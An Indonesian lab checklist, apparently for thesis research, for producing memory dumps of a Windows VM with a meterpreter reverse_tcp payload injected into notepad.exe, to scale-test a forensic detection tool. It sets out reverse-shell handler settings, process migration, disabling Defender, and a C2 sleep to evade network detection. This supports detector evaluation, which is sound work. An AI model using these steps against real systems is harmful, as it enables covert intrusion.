# Checklist Capture Dump 12 & 20 GB (r3 injection) — Uji Skala

> Untuk dipakai Kevin saat di lab. Mereproduksi skenario r3 injection yang
> SUDAH TERBUKTI (Dataset 5), hanya beda ukuran RAM. Tujuan: dapat 2 dump baru
> untuk Tabel A/B uji skala. Aturan: injeksi HARUS terbentuk saat capture,
> kalau tidak R3 tak menyala dan capture harus diulang.

⚠️ **PRIORITAS:** sebarkan UAT ke 7 responden LFD DULU (atau paralel). UAT =
blocker kelulusan. Uji skala = pelengkap. Jangan capture dump besar sampai UAT
bergerak.

---

## Parameter yang HARUS sama dengan Dataset 5 (biar konsisten)

- Victim: Win10 22H2 build **19045.2965**, IP 192.168.70.130
- Attacker Kali: 192.168.70.131, host-only, **tanpa internet**, IP statis
- Payload: **meterpreter reflective DLL** -> inject/migrate ke **`notepad.exe`**
- `notepad.exe` dibuka MANUAL via Explorer (parent = explorer.exe)
- Handler: `multi/handler`, reverse_tcp `:4444`
- Defender Real-time protection **OFF** (meterpreter mentah kena signature).
  Catat sebagai prasyarat lab (setara T1562.001). MsMpEng.exe tetap jalan.
- C2 disenyapkan sebelum capture via meterpreter `sleep 300` (socket ditutup,
  kode tetap resident) -> R2 tetap diam, R3 tetap menyala.
- Akuisisi: **DumpIt (Administrator)**.

**Yang BEDA cuma:** RAM VM (12 GB, lalu 20 GB) dan nama berkas output.

---

## Prosedur per ukuran (ulangi untuk 12 GB, lalu 20 GB)

### A. Siapkan VM
- [ ] Restore snapshot bersih Win10 (build 19045.2965).
- [ ] **Matikan VM** (shutdown, bukan suspend) sebelum ubah RAM.
- [ ] Set RAM VM ke target: **12 GB** (12288 MB) / **20 GB** (20480 MB).
- [ ] Pastikan host masih sisa cukup: 20 GB VM -> host 32 GB sisa ~12 GB. OK.
- [ ] Nyalakan VM. Konfirmasi jaringan **host-only** (bukan NAT/bridged),
      tanpa internet. Cek IP victim 192.168.70.130 & Kali 192.168.70.131 saling
      ping.
- [ ] Konfirmasi **Defender Real-time OFF** di victim.

### B. Reproduksi injeksi r3
- [ ] Di Kali: siapkan handler `multi/handler`, payload
      `windows/x64/meterpreter/reverse_tcp`, LHOST 192.168.70.131, LPORT 4444.
- [ ] Buat/kirim payload meterpreter reflective DLL ke victim (cara sama
      Dataset 5).
- [ ] Di victim: **buka `notepad.exe` MANUAL lewat Explorer** (dobel klik /
      Start menu) supaya parent = explorer.exe. Jangan spawn dari cmd.
- [ ] Jalankan payload -> dapat sesi meterpreter.
- [ ] Di meterpreter: **`migrate` ke PID `notepad.exe`** (cari PID via `ps`).
      Ini meninggalkan segmen PAGE_EXECUTE_READWRITE + PrivateMemory di notepad.
- [ ] Pastikan stager (mis. AtlasHelper.exe) sudah mati otomatis pasca migrate
      (biar tak ada proses \Temp\ pemicu R1/R4).

### C. Senyapkan C2 lalu capture
- [ ] Di meterpreter: **`sleep 300`** (socket ditutup, kode tetap resident).
      Ini yang bikin R2 diam (tak ada ESTABLISHED ke Kali saat capture).
- [ ] Di victim, SELAGI jendela sleep aktif: jalankan **DumpIt sebagai
      Administrator**.
- [ ] Simpan output: `infected_r3_injection_12gb.raw` / `_20gb.raw`.
      (DumpIt menulis ~12/20 GB, butuh waktu & ruang. Pastikan disk lega.)

### D. Verifikasi ground truth SEBELUM matikan VM
- [ ] Di victim: `tasklist` -> catat **PID notepad.exe** yang terinjeksi + PPID
      (harus explorer.exe).
- [ ] (Opsional) di meterpreter konfirmasi sesi masih di notepad.
- [ ] Catat: build OS, waktu capture, PID notepad, PID/PPID.

### E. Pindah & bersihkan
- [ ] Salin dump ke `D:\forensic_triase\dataset_update\`.
- [ ] (Opsional) catat MD5 dump.
- [ ] **Buang snapshot terinfeksi** (jangan biarkan VM terinfeksi hidup).

---

## Setelah dump jadi: jalankan timing (di WSL/laptop analisis)

Untuk tiap dump baru:
```
python3 main.py /mnt/d/forensic_triase/dataset_update/infected_r3_injection_12gb.raw --timing
python3 main.py /mnt/d/forensic_triase/dataset_update/infected_r3_injection_20gb.raw --timing
```

- [ ] Cek output: **PID notepad.exe -> SUSPICIOUS, R3=Y** (deteksi harus TP,
      sama seperti 5 GB). Kalau CLEAN semua -> injeksi tak terbentuk saat
      capture -> ULANG capture.
- [ ] Ambil tabel durasi dari terminal + berkas `<dump>_timing.csv`.
- [ ] Catat total durasi & durasi malfind (diharapkan naik dari titik 5 GB).

**Kondisi ukur seragam (biar angka bersih):**
- [ ] Laptop sama, tak ada beban berat lain jalan.
- [ ] Mode BERURUTAN (jangan --parallel).
- [ ] Simbol ISF sudah ter-cache (5 GB sudah pernah jalan, jadi aman).
- [ ] Idealnya ukur 2x tiap dump, ambil yang stabil (opsional bila waktu mepet).

---

## Titik data yang sudah ada (5 GB, 10 Juli)

| Plugin | 5 GB (detik) |
|---|---|
| pslist | 1,37 |
| pstree | 3,14 |
| netscan | 42,81 |
| malfind | 134,47 |
| dlllist | 39,32 |
| handles | 107,46 |
| **TOTAL** | **328,57** |

Deteksi: PID 3404 notepad.exe -> SUSPICIOUS R3=Y (TP). 147 PID.
CSV: `dataset_update/infected_r3_injection_timing.csv`.

---

## Jebakan yang bikin capture GAGAL (hindari)

1. **Migrate gagal / sesi mati sebelum capture** -> notepad tak punya RWX ->
   R3 tak menyala -> CLEAN semua -> ulang.
2. **Lupa sleep 300** -> ada ESTABLISHED ke Kali saat capture -> R2 ikut
   menyala -> bukan isolasi R3 murni (masih TP tapi tak konsisten Dataset 5).
3. **notepad dibuka dari cmd, bukan Explorer** -> parent salah -> bisa memicu
   R1b -> tak konsisten.
4. **Defender ON** -> meterpreter kena signature, payload gagal jalan.
5. **RAM host tak cukup** (VM 20 GB + host < 32 GB) -> swap/crash saat capture
   -> dump korup. Host 32 GB sudah dikonfirmasi cukup untuk 20 GB.
6. **Analisis pakai --parallel** saat timing -> angka durasi tak bersih. Selalu
   berurutan untuk uji skala.
